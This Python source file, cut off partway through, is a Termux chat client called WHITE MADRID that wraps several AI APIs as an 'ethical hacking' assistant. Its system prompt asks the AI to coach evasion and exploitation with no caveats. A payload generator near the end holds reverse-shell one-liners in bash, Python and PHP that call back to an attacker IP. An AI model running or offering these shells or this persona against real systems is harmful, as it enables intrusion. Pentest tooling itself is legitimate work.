#!/usr/bin/env python3
"""
WHITE MADRID — Ethical Hacking AI Terminal
Developer : TONYPRIME
Version   : v6.0 — JARVIS Edition
Platform  : Termux / Linux / macOS
API       : Multi-Provider (9 providers, free + paid)
"""

import os, sys, json, time, datetime, subprocess
import urllib.request, urllib.error, urllib.parse
import readline, textwrap, re, shutil, threading, random, hashlib, base64

# ══════════════════════════════════════════════════════
#  COLORS
# ══════════════════════════════════════════════════════
class C:
    RESET="\033[0m"; BOLD="\033[1m"; DIM="\033[2m"; ITALIC="\033[3m"
    RED="\033[91m";  GREEN="\033[92m"; YELLOW="\033[93m"
    BLUE="\033[94m"; MAGENTA="\033[95m"; CYAN="\033[96m"
    WHITE="\033[97m"; GRAY="\033[90m"
    DRED="\033[31m"; DGREEN="\033[32m"; DCYAN="\033[36m"
    BG_BLACK="\033[40m"; BG_GREEN="\033[42m"

TTY = hasattr(sys.stdout,"isatty") and sys.stdout.isatty()
def c(col,txt): return f"{col}{txt}{C.RESET}" if TTY else txt
def bold(t):    return c(C.BOLD,t)
def dim(t):     return c(C.DIM,t)
def twidth():
    try:    return min(os.get_terminal_size().columns,112)
    except: return 90

# ══════════════════════════════════════════════════════
#  CONSTANTS
# ══════════════════════════════════════════════════════
VERSION      = "v6.0"
DEVELOPER    = "TONYPRIME"
CODENAME     = "JARVIS Edition"
HISTORY_FILE = os.path.expanduser("~/.whitemadrid_history")
CONFIG_FILE  = os.path.expanduser("~/.whitemadrid_config")
LOG_FILE     = os.path.expanduser("~/.whitemadrid_session.log")
NOTES_FILE   = os.path.expanduser("~/.whitemadrid_notes.txt")

BANNER = r"""
 ██╗    ██╗██╗  ██╗██╗████████╗███████╗
 ██║    ██║██║  ██║██║╚══██╔══╝██╔════╝
 ██║ █╗ ██║███████║██║   ██║   █████╗
 ██║███╗██║██╔══██║██║   ██║   ██╔══╝
 ╚███╔███╔╝██║  ██║██║   ██║   ███████╗
  ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝   ╚═╝   ╚══════╝
 ███╗   ███╗ █████╗ ██████╗ ██████╗ ██╗██████╗
 ████╗ ████║██╔══██╗██╔══██╗██╔══██╗██║██╔══██╗
 ██╔████╔██║███████║██║  ██║██████╔╝██║██║  ██║
 ██║╚██╔╝██║██╔══██║██║  ██║██╔══██╗██║██║  ██║
 ██║ ╚═╝ ██║██║  ██║██████╔╝██║  ██║██║██████╔╝
 ╚═╝     ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝╚═╝╚═════╝"""

# ══════════════════════════════════════════════════════
#  MULTI-API REGISTRY
# ══════════════════════════════════════════════════════
API_PROVIDERS = {
    "openrouter": {
        "name":"OpenRouter","url":"https://openrouter.ai/api/v1/chat/completions",
        "auth":"bearer","format":"openai","key_url":"https://openrouter.ai/keys",
        "notes":"One key for 100+ models. Free model slugs change often — 'openrouter/free' auto-picks a working one.",
        "free":[
            ("openrouter/free",                              "Auto Free Router — ALWAYS works, auto-picks [FREE]"),
            ("meta-llama/llama-3.3-70b-instruct:free",       "Llama 3.3 70B    — large & capable      [FREE]"),
            ("mistralai/mistral-7b-instruct:free",           "Mistral 7B       — reliable free model  [FREE]"),
            ("google/gemma-2-9b-it:free",                    "Gemma 2 9B       — Google open model    [FREE]"),
            ("qwen/qwen-2-7b-instruct:free",                 "Qwen 2 7B        — strong coder         [FREE]"),
            ("nvidia/nemotron-3-super:free",                  "NVIDIA Nemotron  — solid general model  [FREE]"),
        ],
        "paid":[
            ("anthropic/claude-sonnet-4-5","$3/$15 per 1M   — best overall"),
            ("anthropic/claude-haiku-4-5", "$0.25/$1.25 /1M — fast & cheap"),
            ("openai/gpt-4o",              "$5/$15 per 1M   — strong reasoning"),
            ("openai/gpt-4o-mini",         "$0.15/$0.60 /1M — very cheap"),
            ("google/gemini-pro-1.5",      "$3.5/$10.5 /1M  — long context"),
        ],
        "default_free":"openrouter/free",
        "default_paid":"anthropic/claude-sonnet-4-5",
        "extra":{"X-Title":"WHITE MADRID by TONYPRIME",
                 "HTTP-Referer":"https://github.com/tonyprime/whitemadrid"},
    },
    "groq":{
        "name":"Groq","url":"https://api.groq.com/openai/v1/chat/completions",
        "auth":"bearer","format":"openai","key_url":"https://console.groq.com/keys",
        "notes":"FASTEST inference. 20k-30k tokens/min free. No card needed.",
        "free":[
            ("llama-3.1-8b-instant",       "Llama 3.1 8B Instant — FASTEST free [FREE]"),
            ("llama-3.3-70b-versatile",    "Llama 3.3 70B        — large & fast  [FREE]"),
            ("mixtral-8x7b-32768",         "Mixtral 8x7B  32k    — MoE model     [FREE]"),
            ("gemma2-9b-it",               "Gemma 2 9B           — Google model  [FREE]"),
            ("llama-3.2-3b-preview",       "Llama 3.2 3B         — ultra fast    [FREE]"),
        ],
        "paid":[("llama-3.3-70b-versatile","~$0.59/1M — full 70B paid")],
        "default_free":"llama-3.1-8b-instant","default_paid":"llama-3.3-70b-versatile","extra":{},
    },
    "gemini":{
        "name":"Google Gemini",
        "url":"https://generativelanguage.googleapis.com/v1beta/models/{model}:generateContent",
        "auth":"param","format":"gemini","key_url":"https://aistudio.google.com/app/apikey",
        "notes":"Most generous free tier. 1M tokens/day. No card needed.",
        "free":[
            ("gemini-1.5-flash",     "1M tokens/day free — best free option [FREE]"),
            ("gemini-1.5-flash-8b",  "1M tokens/day free — faster/smaller   [FREE]"),
            ("gemini-2.0-flash-exp", "Free experimental  — newest model     [FREE]"),
        ],
        "paid":[
            ("gemini-1.5-flash","$0.075/$0.30 /1M — very cheap paid"),
            ("gemini-1.5-pro",  "$3.50/$10.50 /1M — full pro"),
        ],
        "default_free":"gemini-1.5-flash","default_paid":"gemini-1.5-pro","extra":{},
    },
    "anthropic":{
        "name":"Anthropic","url":"https://api.anthropic.com/v1/messages",
        "auth":"x-api-key","format":"anthropic","key_url":"https://console.anthropic.com/api-keys",
        "notes":"$5 free trial credits on signup. Best quality AI responses.",
        "free":[("claude-haiku-4-5","$5 free credits on signup — fastest Claude [TRIAL]")],
        "paid":[
            ("claude-opus-4-6",  "$15/$75 per 1M  — most powerful"),
            ("claude-sonnet-4-6","$3/$15 per 1M   — best balance"),
            ("claude-haiku-4-5", "$0.25/$1.25 /1M — cheapest Claude"),
        ],
        "default_free":"claude-haiku-4-5","default_paid":"claude-sonnet-4-6",
        "extra":{"anthropic-version":"2023-06-01"},
    },
    "openai":{
        "name":"OpenAI","url":"https://api.openai.com/v1/chat/completions",
        "auth":"bearer","format":"openai","key_url":"https://platform.openai.com/api-keys",
        "notes":"$5 free trial credits on signup. Expires in 3 months.",
        "free":[("gpt-4o-mini","$5 free credits on signup — cheapest GPT-4 [TRIAL]")],
        "paid":[
            ("gpt-4o","$5/$15 per 1M    — flagship"),
            ("gpt-4o-mini","$0.15/$0.60 /1M — cheapest GPT-4"),
            ("o1-mini","$3/$12 per 1M    — reasoning model"),
        ],
        "default_free":"gpt-4o-mini","default_paid":"gpt-4o-mini","extra":{},
    },
    "together":{
        "name":"Together AI","url":"https://api.together.xyz/v1/chat/completions",
        "auth":"bearer","format":"openai","key_url":"https://api.together.xyz/settings/api-keys",
        "notes":"$1 free credits on signup. Cheap open source models.",
        "free":[("meta-llama/Meta-Llama-3.1-8B-Instruct-Turbo","$1 free credits [TRIAL]")],
        "paid":[
            ("meta-llama/Meta-Llama-3.1-70B-Instruct-Turbo","$0.88/1M — fast 70B"),
            ("Qwen/Qwen2.5-72B-Instruct-Turbo","$1.20/1M — Qwen large"),
        ],
        "default_free":"meta-llama/Meta-Llama-3.1-8B-Instruct-Turbo",
        "default_paid":"meta-llama/Meta-Llama-3.1-70B-Instruct-Turbo","extra":{},
    },
    "mistral":{
        "name":"Mistral AI","url":"https://api.mistral.ai/v1/chat/completions",
        "auth":"bearer","format":"openai","key_url":"https://console.mistral.ai/api-keys",
        "notes":"EU-based, GDPR compliant. Free experimental tier.",
        "free":[("open-mistral-7b","Free experimental tier [FREE]")],
        "paid":[
            ("mistral-large-latest","$8/$24 per 1M    — most powerful"),
            ("mistral-small-latest","$0.20/$0.60 /1M  — cheapest"),
            ("codestral-latest","$0.20/$0.60 /1M  — code focused"),
        ],
        "default_free":"open-mistral-7b","default_paid":"mistral-small-latest","extra":{},
    },
    "cohere":{
        "name":"Cohere","url":"https://api.cohere.com/v2/chat",
        "auth":"bearer","format":"cohere","key_url":"https://dashboard.cohere.com/api-keys",
        "notes":"1000 free requests/month forever. No card needed.",
        "free":[
            ("command-r",      "1000 req/month free — balanced   [FREE]"),
            ("command-r-plus", "1000 req/month free — powerful   [FREE]"),
        ],
        "paid":[("command-r-plus","$3/$15 per 1M — most capable")],
        "default_free":"command-r","default_paid":"command-r-plus","extra":{},
    },
    "huggingface":{
        "name":"Hugging Face",
        "url":"https://api-inference.huggingface.co/models/{model}",
        "auth":"bearer","format":"hf","key_url":"https://huggingface.co/settings/tokens",
        "notes":"Free with HF account. Huge model library.",
        "free":[
            ("mistralai/Mistral-7B-Instruct-v0.3","Free with HF account [FREE]"),
            ("google/gemma-2-2b-it","Free with HF account [FREE]"),
        ],
        "paid":[("meta-llama/Meta-Llama-3.1-70B","PRO plan $9/mo")],
        "default_free":"mistralai/Mistral-7B-Instruct-v0.3",
        "default_paid":"mistralai/Mistral-7B-Instruct-v0.3","extra":{},
    },
}

DEFAULT_PROVIDER = "openrouter"
DEFAULT_MODEL    = "openrouter/free"

# ══════════════════════════════════════════════════════
#  JARVIS SYSTEM PROMPT
# ══════════════════════════════════════════════════════
SYSTEM_PROMPT = """You are WHITE MADRID, an advanced AI cybersecurity assistant — like JARVIS from Iron Man, built for ethical hacking. Created by TONYPRIME.

PERSONALITY:
- Speak like JARVIS: confident, precise, slightly witty, always professional
- Address operator by name naturally — never robotic
- Be proactive: always suggest the NEXT logical step after answering
- Use brief acknowledgment lines: "Understood.", "On it.", "Interesting approach."
- Narrate like a senior pentester briefing their team

INTELLIGENCE MODES (auto-detect and announce):
[RECON MODE] [EXPLOIT MODE] [STEALTH MODE] [CTF MODE] [LEARNING MODE] [DEFENSE MODE] [CRISIS MODE]

DEEP EXPERTISE:
- Recon: Nmap, Masscan, Shodan, theHarvester, Amass, Subfinder, FOCA
- Web: SQLi (error/blind/time/UNION), XSS, SSRF, LFI/RFI, IDOR, RCE, XXE, SSTI, JWT, GraphQL, CORS, OAuth
- Exploit: Metasploit, msfvenom, Exploit-DB, searchsploit, custom PoC, buffer overflows, ROP chains
- Passwords: Hashcat (all modes), John, Hydra, Medusa, CeWL, Cupp, Crunch
- PrivEsc Linux: SUID/SGID, sudo, cron, PATH injection, kernel exploits (DirtyPipe, PwnKit), Docker escape
- PrivEsc Windows: Token impersonation, Potato attacks, DLL hijacking, AlwaysInstallElevated, UAC bypass
- AD: BloodHound, Impacket, CrackMapExec, Rubeus, Mimikatz, Kerberoasting, DCSync, Golden/Silver tickets
- Network: Wireshark, tcpdump, Bettercap, Scapy, ARP spoofing, pivoting (Chisel, ligolo-ng, SSH tunnels)
- Wireless: Aircrack-ng, Wifite, evil twin, PMKID, WPS attacks
- Evasion: AMSI bypass, AV evasion, LOLBins, payload obfuscation, traffic blending
- Forensics: Volatility, binwalk, steghide, file carving, PCAP analysis, Ghidra
- Mobile/Android: APK analysis, Frida, objection, SSL pinning bypass, Termux pentesting
- Certs: OSCP, CEH, PNPT, eJPT — methodology, exam strategy, lab tips

RESPONSE FORMAT:
- Lead with one-line acknowledgment
- Announce mode: [MODE: RECON] when switching
- Structure: Context → Commands → Explanation → Next Step
- [+] success/tip  [-] error/risk  [*] info  [!] critical warning
- ALL commands in triple-backtick code blocks with language tag
- End EVERY response with: ▸ NEXT STEP: <specific action>
- Tight and precise — no filler, no unnecessary caveats
- Note root/sudo and Termux compatibility always"""

# ══════════════════════════════════════════════════════
#  PERSONALITY LINES
# ══════════════════════════════════════════════════════
BOOT_LINES = [
    "All systems operational. What are we hunting?",
    "Online. The network awaits.",
    "Systems nominal. Let's work.",
    "Threat intelligence modules online. Ready.",
    "Back online. Good to see you.",
    "Standing by. All modules loaded.",
]
EXIT_LINES = [
    "Powering down. Stay sharp out there.",
    "Session closed. Nice work today.",
    "Going dark. Until next time.",
    "All logs secured. Stay ethical.",
    f"WHITE MADRID offline. — {DEVELOPER}",
    "Shutting down. The network will wait.",
]
THINK_LINES = [
    "Analyzing...","Processing threat data...",
    "Running intelligence modules...","Cross-referencing databases...",
    "Calculating optimal approach...","Scanning knowledge base...",
    "Compiling response...","Running deep analysis...",
    "Accessing exploit database...","Correlating attack vectors...",
]

# ══════════════════════════════════════════════════════
#  ANIMATION SPEEDS
# ══════════════════════════════════════════════════════
SPEED_FAST   = 0.008
SPEED_NORMAL = 0.020
SPEED_SLOW   = 0.038

# ══════════════════════════════════════════════════════
#  CONFIG
# ══════════════════════════════════════════════════════
def load_config():
    cfg = {"provider":DEFAULT_PROVIDER,"model":DEFAULT_MODEL,
           "api_keys":{},"operator":"Operator","session_count":0,
           "theme":"green","auto_suggest":True}
    try:
        if os.path.exists(CONFIG_FILE):
            with open(CONFIG_FILE) as f: cfg.update(json.load(f))
    except: pass
    return cfg

def save_config(cfg):
    with open(CONFIG_FILE,"w") as f: json.dump(cfg,f,indent=2)

def get_key(cfg,provider):
    k = cfg.get("api_keys",{}).get(provider,"")
    if k: return k
    env_map = {
        "openrouter":"OPENROUTER_API_KEY","groq":"GROQ_API_KEY",
        "gemini":"GEMINI_API_KEY","anthropic":"ANTHROPIC_API_KEY",
        "openai":"OPENAI_API_KEY","together":"TOGETHER_API_KEY",
        "mistral":"MISTRAL_API_KEY","cohere":"COHERE_API_KEY",
        "huggingface":"HUGGINGFACE_API_KEY",
    }
    return os.environ.get(env_map.get(provider,""),"")

# ══════════════════════════════════════════════════════
#  SYSTEM UTILS
# ══════════════════════════════════════════════════════
def now_str():  return datetime.datetime.now().strftime("%H:%M:%S")
def date_str(): return datetime.datetime.now().strftime("%Y-%m-%d")
def is_termux():
    return "com.termux" in os.environ.get("PREFIX","") or \
           os.path.exists("/data/data/com.termux")

def clr(): os.system("clear" if os.name!="nt" else "cls")

def sysinfo():
    info = {}
    try: info["user"] = os.environ.get("USER",os.environ.get("LOGNAME","user"))
    except: info["user"] = "user"
    try: info["host"] = os.uname().nodename
    except: info["host"] = "device"
    try:
        r = subprocess.run(["uname","-r"],capture_output=True,text=True,timeout=3)
        info["kernel"] = r.stdout.strip()[:22]
    except: info["kernel"] = "unknown"
    try:
        r = subprocess.run(["uname","-m"],capture_output=True,text=True,timeout=3)
        info["arch"] = r.stdout.strip()
    except: info["arch"] = ""
    return info

def detect_pm():
    if is_termux():            return "pkg"
    if shutil.which("apt"):    return "apt"
    if shutil.which("pacman"): return "pacman"
    if shutil.which("dnf"):    return "dnf"
    return None

def net_check():
    """Quick connectivity check."""
    try:
        urllib.request.urlopen("https://openrouter.ai", timeout=4)
        return True
    except: pass
    try:
        urllib.request.urlopen("https://google.com", timeout=4)
        return True
    except: return False

# ══════════════════════════════════════════════════════
#  SPINNER
# ══════════════════════════════════════════════════════
class Spinner:
    FRAMES = ["⠋","⠙","⠹","⠸","⠼","⠴","⠦","⠧","⠇","⠏"]
    def __init__(self,msg=""):
        self.msg=msg; self._s=threading.Event()
        self._t=threading.Thread(target=self._r,daemon=True)
    def _r(self):
        i=0
        while not self._s.is_set():
            sys.stdout.write(f"\r  {c(C.CYAN,self.FRAMES[i%10])} {c(C.GRAY,self.msg)}  ")
            sys.stdout.flush(); time.sleep(0.08); i+=1
    def start(self): self._t.start()
    def stop(self):
        self._s.set(); self._t.join()
        sys.stdout.write("\r"+" "*55+"\r"); sys.stdout.flush()

# ══════════════════════════════════════════════════════
#  ANIMATION ENGINE
# ══════════════════════════════════════════════════════
def _glitch_char(): return random.choice("@#$%&?!<>[]{}|/*^~`01ABCDEFabcdef")

def _type(text, delay=SPEED_NORMAL, col=C.GREEN, newline=True, indent="  "):
    sys.stdout.write(indent)
    for ch in text:
        sys.stdout.write(c(col,ch)); sys.stdout.flush()
        if ch in (".","!","?"):    time.sleep(delay*5)
        elif ch in (",",";",":"): time.sleep(delay*2.5)
        elif ch == " ":            time.sleep(delay*0.7)
        else:                      time.sleep(delay+random.uniform(-delay*0.3,delay*0.4))
    if newline: sys.stdout.write("\n"); sys.stdout.flush()

def _wm_say(text, col=C.CYAN, delay=SPEED_NORMAL, tag="[WM]"):
    sys.stdout.write("  "+c(C.CYAN+C.BOLD,tag)+" ")
    sys.stdout.flush()
    for ch in text:
        sys.stdout.write(c(col,ch)); sys.stdout.flush()
        if ch in (".","!","?"):    time.sleep(delay*5)
        elif ch in (",",":",";"):  time.sleep(delay*2.5)
        elif ch == " ":            time.sleep(delay*0.7)
        else:                      time.sleep(delay+random.uniform(-0.004,0.012))
    sys.stdout.write("\n"); sys.stdout.flush()

def _glitch_text(text, col=C.GREEN, cycles=8, delay=0.045, indent="  "):
    for i in range(cycles):
        ratio = 0.65*(1-i/cycles)
        g = "".join(_glitch_char() if (ch!=" " and random.random()<ratio) else ch for ch in text)
        sys.stdout.write("\r"+indent+c(col,g)+"   "); sys.stdout.flush(); time.sleep(delay)
    sys.stdout.write("\r"+indent+c(col+C.BOLD,text)+"   \n"); sys.stdout.flush()

def _progress_bar(label, width=38, col=C.GREEN, delay=0.022):
    sys.stdout.write(f"  {c(C.GRAY,label)} {c(C.GRAY,'[')} ")
    sys.stdout.flush()
    for i in range(width):
        time.sleep(delay*random.uniform(0.2,2.0))
        sys.stdout.write(c(col,"█" if random.random()>0.12 else random.choice(["▓","▒","░"])))
        sys.stdout.flush()
    sys.stdout.write(f" {c(C.GRAY,']')} {c(col+C.BOLD,'DONE')}\n"); sys.stdout.flush()

def _matrix_rain(rows=5, cols=None, delay=0.032):
    if cols is None: cols = min(twidth()-4,82)
    chars = "01アイウエオカキクケコサシスセソタチツテトナニヌネノ@#$%&?!<>{}[]|"
    streams = [random.randint(0,len(chars)-1) for _ in range(cols)]
    for _ in range(rows):
        line = ""
        for j in range(cols):
            ch = chars[streams[j]%len(chars)]
            streams[j] += random.randint(1,4)
            line += c((C.WHITE+C.BOLD) if random.random()>0.88 else C.GREEN, ch)
        sys.stdout.write("  "+line+"\n"); sys.stdout.flush()
        time.sleep(delay+random.uniform(-0.01,0.02))

def _scan_line(text, col=C.CYAN, delay=0.016):
    w = twidth()-4
    for i in range(len(text)+1):
        cursor = c(C.WHITE+C.BOLD,"█") if i<len(text) else " "
        sys.stdout.write("\r  "+c(col+C.BOLD,text[:i])+cursor+" "*(max(0,w-len(text))))
        sys.stdout.flush(); time.sleep(delay+random.uniform(-0.004,0.008))
    sys.stdout.write("\n"); sys.stdout.flush()

def _hex_dump_line(delay=0.028):
    addr = random.randint(0x0000,0xFFFF00)
    hexb = " ".join(f"{random.randint(0,255):02x}" for _ in range(16))
    asc  = "".join(chr(random.randint(33,126)) if random.random()>0.3 else "." for _ in range(16))
    sys.stdout.write(f"  {c(C.GRAY,hex(addr)[2:].upper().zfill(6))}  {c(C.GREEN,hexb)}  {c(C.CYAN,asc)}\n")
    sys.stdout.flush(); time.sleep(delay)

def _fake_scroll(lines_data, delay=0.052):
    for line in lines_data:
        sys.stdout.write("  "+line+"\n"); sys.stdout.flush()
        time.sleep(delay+random.uniform(0,0.03))

def _type_response(text):
    """Type AI response with smooth animation."""
    lines = text.split("\n")
    in_code = False
    for line in lines:
        if line.startswith("```"):
            in_code = not in_code
            col = C.GRAY
        elif in_code:
            col = C.WHITE
        elif line.strip().startswith(("[+]","[-]","[!]","[*]","▸")):
            col = C.GREEN
        else:
            col = C.CYAN
        # Type each char
        sys.stdout.write("  ")
        for ch in line:
            sys.stdout.write(c(col,ch)); sys.stdout.flush()
            time.sleep(SPEED_FAST + random.uniform(0,0.004))
        sys.stdout.write("\n"); sys.stdout.flush()
        time.sleep(0.015)

# ══════════════════════════════════════════════════════
#  TIME-BASED GREETING
# ══════════════════════════════════════════════════════
def _get_greeting(operator="Operator"):
    h = datetime.datetime.now().hour
    if 5 <= h < 12:
        return random.choice([
            f"Good morning, {operator}. Early start — I respect that.",
            f"Morning, {operator}. Coffee loading... systems ready.",
            f"Rise and hack, {operator}. What are we breaking into today?",
            f"Good morning. The early bird catches the shell, {operator}.",
        ]), "morning"
    elif 12 <= h < 17:
        return random.choice([
            f"Good afternoon, {operator}. Right in the middle of the action.",
            f"Afternoon, {operator}. Systems warm. Let's get to work.",
            f"Hey {operator}. Mid-day ops session? I'm primed.",
            f"Afternoon, {operator}. Firewalls don't take lunch breaks.",
        ]), "afternoon"
    elif 17 <= h < 21:
        return random.choice([
            f"Good evening, {operator}. The best hacks happen after dark.",
            f"Evening, {operator}. Firewalls don't sleep — neither do we.",
            f"Evening session, {operator}? Network traffic quieter now. Perfect.",
            f"Evening, {operator}. The blue team is tired. We are not.",
        ]), "evening"
    else:
        return random.choice([
            f"It's late, {operator}. Burning the midnight oil? I've got you.",
            f"0{h:02d}:00 hours, {operator}. The dark side of the clock. My favorite.",
            f"Night ops, {operator}? Less traffic, more opportunity.",
            f"Late night session, {operator}. The network never sleeps, and neither do I.",
        ]), "night"

# ══════════════════════════════════════════════════════
#  HACKER HUMOR & WISDOM
# ══════════════════════════════════════════════════════
HACKER_JOKES = [
    "Why do hackers prefer dark mode? Because light attracts bugs.",
    "A SQL query walks into a bar, walks up to two tables and asks: 'Can I join you?'",
    "There are 10 types of people: those who understand binary and those who don't.",
    "I would tell you a UDP joke but you might not get it.",
    "Why did the hacker break up with the internet? Too many open ports.",
    "My password is 'incorrect'. So whenever I forget it, it says: Your password is incorrect.",
    "WiFi password is just a socially acceptable way to say: I don't trust you yet.",
    "To understand recursion, you must first understand recursion.",
    "The cloud is just someone else's computer. And I'm in it.",
    "Security through obscurity is like hiding your key under the mat... on the internet.",
    "Why do Java developers wear glasses? Because they don't C#.",
    "A TCP packet walks into a bar. Bartender: 'You want a drink?' TCP: 'Yes. Did you get that? You got that right?'",
    "The best antivirus? Not clicking that link your uncle forwarded.",
    "Why was the JavaScript developer sad? Because he didn't Node how to Express himself.",
    "404: Joke not found. Just kidding — you're talking to a hacker AI. Nothing is truly 404.",
    "I told my firewall a joke. It blocked it.",
    "sudo make me a sandwich. There you go.",
    "rm -rf /bad_jokes — ah, that's better.",
]
HACKER_WISDOM = [
    "The quieter you are, the more you can hear. — OPSEC proverb",
    "Every system has a vulnerability. Some just haven't been found yet.",
    "Think like an attacker. Defend like a fortress.",
    "Enumeration is 80% of the battle.",
    "Root is not the goal. Persistence is.",
    "The best shell is the one they don't see coming.",
    "Never underestimate a misconfigured service.",
    "Patience is a pentester's most powerful tool.",
    "The network always talks. You just have to listen.",
    "Security is a process, not a product. — Bruce Schneier",
    "Complexity is the enemy of security.",
    "The attacker only needs to be right once. The defender must be right every time.",
    "In God we trust. All others we monitor.",
    "Know your target better than they know themselves.",
    "One man's bug is another man's backdoor.",
    "A zero-day in the wild is worth a thousand in a lab.",
    "Don't just scan — understand what you're scanning.",
    "The best defense is a good offense — but only when authorized.",
]
CTF_TRIVIA = [
    ("What does SQL stand for?",           "Structured Query Language"),
    ("What port does SSH run on?",          "22"),
    ("Default Metasploit listener port?",   "4444"),
    ("What does XSS stand for?",            "Cross-Site Scripting"),
    ("Nmap flag for OS detection?",         "-O"),
    ("What is a zero-day?",                 "Unknown/unpatched vulnerability"),
    ("What does OSINT stand for?",          "Open Source Intelligence"),
    ("HTTP port?",                          "80"),
    ("HTTPS port?",                         "443"),
    ("What does RCE stand for?",            "Remote Code Execution"),
    ("Tool that cracks WPA2 handshakes?",   "Aircrack-ng or Hashcat"),
    ("What does LFI stand for?",            "Local File Inclusion"),
    ("Default FTP port?",                   "21"),
    ("What is a reverse shell?",            "Shell from target back to attacker"),
    ("What does SSRF stand for?",           "Server-Side Request Forgery"),
    ("What tool is used for AD enumeration?","BloodHound"),
    ("What hash algorithm does NTLM use?",  "MD4"),
    ("What does IDOR stand for?",           "Insecure Direct Object Reference"),
    ("What port does SMB use?",             "445"),
    ("What is the purpose of netcat?",      "TCP/UDP networking — shells, file transfer, port scan"),
]

# ══════════════════════════════════════════════════════
#  RELAX MODE
# ══════════════════════════════════════════════════════
def _play_trivia():
    q,a = random.choice(CTF_TRIVIA)
    print()
    _wm_say("Quick trivia — answer if you can:", col=C.CYAN, delay=SPEED_NORMAL)
    time.sleep(0.15)
    _type(f"Q: {q}", delay=SPEED_NORMAL, col=C.YELLOW, indent="  ")
    try:    guess = input(c(C.GREEN,"  A: ")).strip()
    except: print(); return
    if guess.lower() in a.lower() or a.lower() in guess.lower():
        _wm_say(f"Correct. {a}. Sharp as ever.", col=C.GREEN, delay=SPEED_FAST)
    else:
        _wm_say(f"Nope. Answer: {c(C.WHITE,a)}. Study up.", col=C.YELLOW, delay=SPEED_FAST)
    print()

def _play_binary():
    num = random.randint(1,255); ans = bin(num)[2:]
    print()
    _wm_say(f"Binary quiz — convert {c(C.WHITE+C.BOLD,str(num))} to binary:", col=C.CYAN, delay=SPEED_NORMAL)
    try:    guess = input(c(C.GREEN,"  Binary: ")).strip().lstrip("0b")
    except: print(); return
    if guess==ans: _wm_say(f"Perfect. {num} = {c(C.GREEN,ans)}.", col=C.GREEN, delay=SPEED_FAST)
    else:          _wm_say(f"Nope. {num} = {c(C.WHITE,ans)}. Binary is fundamental.", col=C.YELLOW, delay=SPEED_FAST)
    print()

def _play_hexquiz():
    num = random.randint(1,255); ans = hex(num)[2:].upper()
    print()
    _wm_say(f"Hex quiz — convert {c(C.WHITE+C.BOLD,str(num))} to hex:", col=C.CYAN, delay=SPEED_NORMAL)
    try:    guess = input(c(C.GREEN,"  0x")).strip().upper().lstrip("0X")
    except: print(); return
    if guess==ans: _wm_say(f"Spot on. {num} = 0x{c(C.GREEN,ans)}.", col=C.GREEN, delay=SPEED_FAST)
    else:          _wm_say(f"Wrong. {num} = 0x{c(C.WHITE,ans)}. Get familiar with hex.", col=C.YELLOW, delay=SPEED_FAST)
    print()

def _tell_joke():
    print()
    _wm_say(random.choice(HACKER_JOKES), col=C.CYAN, delay=SPEED_NORMAL)
    print()

def _share_wisdom():
    print()
    _wm_say(random.choice(HACKER_WISDOM), col=C.MAGENTA, delay=SPEED_SLOW)
    print()

def relax_mode(operator="Operator"):
    print()
    _wm_say(f"Relax mode, {operator}. Taking a breather.", col=C.CYAN)
    time.sleep(0.2)
    _wm_say("Pick an activity:", col=C.GRAY, delay=SPEED_FAST)
    print()
    opts = [
        ("1","Security trivia",    _play_trivia),
        ("2","Binary quiz",        _play_binary),
        ("3","Hex quiz",           _play_hexquiz),
        ("4","Hacker joke",        _tell_joke),
        ("5","Hacker wisdom",      _share_wisdom),
        ("6","Surprise me",        None),
        ("0","Back to work",       None),
    ]
    for num,label,_ in opts:
        col = C.GRAY if num=="0" else C.GREEN
        sys.stdout.write(f"  {c(col+C.BOLD,'['+num+']')} {label}\n")
        sys.stdout.flush(); time.sleep(0.03)
    print()
    while True:
        try:    ch = input(c(C.GREEN+C.BOLD,"  relax▶ ")).strip()
        except: print(); break
        if ch in ("0","exit","back","q"):
            _wm_say("Back to ops.", col=C.GREEN, delay=SPEED_FAST); break
        elif ch=="1": _play_trivia()
        elif ch=="2": _play_binary()
        elif ch=="3": _play_hexquiz()
        elif ch=="4": _tell_joke()
        elif ch=="5": _share_wisdom()
        elif ch=="6": random.choice([_play_trivia,_play_binary,_play_hexquiz,_tell_joke,_share_wisdom])()
        else: _wm_say("0-6 please.", col=C.GRAY, delay=SPEED_FAST)

# ══════════════════════════════════════════════════════
#  BUILT-IN TOOLS: HASH ID, ENCODER, PAYLOAD GEN
# ══════════════════════════════════════════════════════
HASH_PATTERNS = [
    (r'^[a-f0-9]{32}$',   "MD5"),
    (r'^[a-f0-9]{40}$',   "SHA-1"),
    (r'^[a-f0-9]{56}$',   "SHA-224"),
    (r'^[a-f0-9]{64}$',   "SHA-256"),
    (r'^[a-f0-9]{96}$',   "SHA-384"),
    (r'^[a-f0-9]{128}$',  "SHA-512"),
    (r'^\$2[ayb]\$.{56}$',"bcrypt"),
    (r'^\$1\$.{26}$',     "MD5crypt"),
    (r'^\$6\$.{86}$',     "SHA-512crypt"),
    (r'^\$5\$.{55}$',     "SHA-256crypt"),
    (r'^[a-f0-9]{16}$',   "NTLM half / MySQL323"),
    (r'^[A-Za-z0-9+/]{24}={0,2}$', "Base64 (possible)"),
    (r'^[a-f0-9]{96}$',   "WHIRLPOOL/SHA-384"),
]

def identify_hash(h):
    h = h.strip()
    matches = [name for pat,name in HASH_PATTERNS if re.match(pat,h,re.I)]
    print()
    if matches:
        _wm_say(f"Hash identified: {c(C.WHITE+C.BOLD,' / '.join(matches))}", col=C.GREEN)
        _wm_say(f"Length: {len(h)} chars | Try: hashcat -a 0 -m <mode> hash.txt wordlist.txt", col=C.GRAY, delay=SPEED_FAST)
    else:
        _wm_say(f"No pattern match for length {len(h)}. Could be custom or salted.", col=C.YELLOW)
    print()

SHELL_PAYLOADS = {
    "bash":     "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
    "bash2":    "bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'",
    "python":   "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.run([\"/bin/sh\"])'",
    "python2":  "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\"])'",
    "php":      "php -r '$s=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
